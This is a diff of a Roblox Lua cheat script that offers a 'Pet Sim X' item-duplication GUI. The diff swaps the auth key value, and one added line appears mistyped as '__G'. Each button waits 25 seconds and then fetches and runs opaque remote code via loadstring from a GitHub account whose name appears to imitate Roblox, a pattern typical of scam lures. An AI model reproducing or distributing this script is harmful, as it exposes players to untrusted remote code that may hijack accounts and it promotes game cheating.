@@ -23,11 +23,11 @@ local Tab = Window:NewTab("Pet Sim X")
 local Section = Tab:NewSection("Press To Load Dupe Script(WAIT 25 SEC AFTER CLICK)")
 Section:NewButton("Key - Press To Copy Dupe Key To Clipboard ", "Press To Copy To Clipboard", function ()
     wait (25)
-    _G.AuthKey = "1756816c-f89c-44a2-a7f2-e8bc18baf720"
+    __G.AuthKey = "8240272a-ce4f-4d7a-949a-433dbdebaf36"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/RobIoxScripts/GUI/main/load.lua"))()
 end)
 Section:NewButton("PetSimX SCRIPT", "PRESS FOR SCRIPT", function()
     wait (25)
-    _G.AuthKey = "1756816c-f89c-44a2-a7f2-e8bc18baf720"
+    _G.AuthKey = "8240272a-ce4f-4d7a-949a-433dbdebaf36"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/RobIoxScripts/GUI/main/load.lua"))()
 end)
